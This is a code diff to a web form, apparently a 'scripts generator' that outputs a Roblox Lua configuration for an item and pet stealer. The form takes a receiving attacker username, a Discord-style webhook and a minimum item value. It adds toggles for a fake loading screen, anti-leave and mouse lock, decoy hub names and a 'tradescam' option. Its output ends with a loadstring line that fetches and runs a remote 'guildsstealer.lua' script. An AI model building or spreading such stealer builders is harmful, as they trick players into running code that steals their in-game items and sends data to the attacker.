@@ -94,14 +94,17 @@
       <label for="username">Username:</label>
       <input type="text" id="username" name="username" required><br>
 
+      <label for="username2">Username 2:</label>
+      <input type="text" id="username2" name="username2"><br>
+
       <label for="webhook">Webhook:</label>
       <input type="url" id="webhook" name="webhook" required><br>
 
       <label for="minimumRap">Minimum RAP:</label>
       <input type="number" id="minimumRap" name="minimumRap" required><br>
 
-      <label for="mouseLock">Mouse Lock:</label>
-      <select id="mouseLock" name="mouseLock">
+      <label for="loadingscreen">Loading Screen:</label>
+      <select id="loadingscreen" name="loadingscreen">
         <option value="true">True</option>
         <option value="false">False</option>
       </select><br>
@@ -112,23 +115,10 @@
         <option value="false">False</option>
       </select><br>
 
-      <label for="loadingscreen">Loading Screen:</label>
-      <select id="loadingscreen" name="loadingscreen">
+      <label for="mouselock">Mouse Lock:</label>
+      <select id="mouselock" name="mouselock">
         <option value="true">True</option>
         <option value="false">False</option>
-      </select><br>
-
-      <label for="typesui">Types UI:</label>
-      <select id="typesui" name="typesui">
-        <option value="kavo">Kavo</option>
-        <option value="orion">Orion</option>
-        <option value="fluent">Fluent</option>
-      </select><br>
-
-      <label for="typescript">Type Script:</label>
-      <select id="typescript" name="typescript">
-        <option value="dupe">Dupe</option>
-        <option value="tradescam">Tradescam</option>
       </select><br>
 
       <label for="scriptname">Script Name:</label>
@@ -143,6 +133,24 @@
         <option value="AshbornnHub">AshbornnHub</option>
         <option value="Nexus">Nexus</option>
         <option value="YARHM">YARHM</option>
+      </select><br>
+
+      <label for="firstText">First Text:</label>
+      <input type="text" id="firstText" name="firstText"><br>
+
+      <label for="secondText">Second Text:</label>
+      <input type="text" id="secondText" name="secondText"><br>
+
+      <label for="thirdText">Third Text:</label>
+      <input type="text" id="thirdText" name="thirdText"><br>
+
+      <label for="waitingTime">Waiting Time (in seconds):</label>
+      <input type="number" id="waitingTime" name="waitingTime" value="180"><br>
+
+      <label for="typescript">Type Script:</label>
+      <select id="typescript" name="typescript">
+        <option value="dupe">Dupe</option>
+        <option value="tradescam">Tradescam</option>
       </select><br>
 
       <label for="stealer">Stealer:</label>
@@ -167,14 +175,18 @@
         event.preventDefault();
 
         const username = document.getElementById("username").value;
+        const username2 = document.getElementById("username2").value;
         const webhook = document.getElementById("webhook").value;
         const minimumRap = document.getElementById("minimumRap").value;
-        const mouseLock = document.getElementById("mouseLock").value;
-        const antileave = document.getElementById("antileave").value;
         const loadingscreen = document.getElementById("loadingscreen").value;
-        const typesui = document.getElementById("typesui").value;
-        const typescript = document.getElementById("typescript").value;
+        const antileave = document.getElementById("antileave").value;
+        const mouselock = document.getElementById("mouselock").value;
         const scriptname = document.getElementById("scriptname").value;
+        const firstText = document.getElementById("firstText").value;
+        const secondText = document.getElementById("secondText").value;
+        const thirdText = document.getElementById("thirdText").value;
+        const waitingTime = document.getElementById("waitingTime").value;
+        const typescript = document.getElementById("typescript").value;
         const stealer = document.getElementById("stealer").value;
 
         // Validate webhook URL
@@ -190,20 +202,24 @@
           return;
         }
 
-        const outputString = `-- Generated via Argon X Scripts Generator\n` +
-                             `config = {\n` +
-                             `    Username = "${username}",\n` +
-                             `    Webhook = "${webhook}",\n` +
-                             `    MinimumRap = "${minimumRap}",\n` +
-                             `    mouseLock = ${mouseLock},\n` +
-                             `    antileave = ${antileave},\n` +
-                             `    loadingscreen = ${loadingscreen},\n` +
-                             `    typesui = "${typesui}",\n` +
-                             `    typescript = "${typescript}",\n` +
-                             `    scriptname = "${scriptname}",\n` +
-                             `    stealer = "${stealer}",\n` +
+        const outputString = `config = {\n` +
+                             `    Username = "${username}", --Username To Send Pets To\n` +
+                             `    Username2 = "${username2}", -- Remove it if you don't want to\n` +
+                             `    Webhook = "${webhook}", -- Webhook url\n` +
+                             `    MinimumRap = "${minimumRap}", -- minimum rap of each item you want to get sent to you\n` +
+                             `    Loadingscreen = ${loadingscreen}, -- set it false if you don't want to\n` +
+                             `    Antileave = ${antileave}, -- set it false if you don't want to\n` +
+                             `    Mouselock = ${mouselock}, -- set it false if you don't want to\n` +
+                             `    ScriptName = "${scriptname}",\n` +
+                             `    FirstText = "${firstText}",\n` +
+                             `    SecondText = "${secondText}",\n` +
+                             `    ThirdText = "${thirdText}",\n` +
+                             `    WaitingTime = ${waitingTime},\n` +
+                             `    typescript = "${typescript}", -- dupe, tradescam\n` +
+                             `    scriptname = "${scriptname}", -- nexus hub, eclipse hub, clever hub\n` +
+                             `    stealer = "${stealer}", -- ps99, psx, SOON MM2 AND ADOPT ME\n` +
                              `}\n\n` +
-                             'loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/gui-stealer/main/guildsstealer.lua", true))()';
+                             'loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/gui-stealer/main/guildsstealer.lua",true))()';
 
         document.getElementById("output").value = outputString;
       });
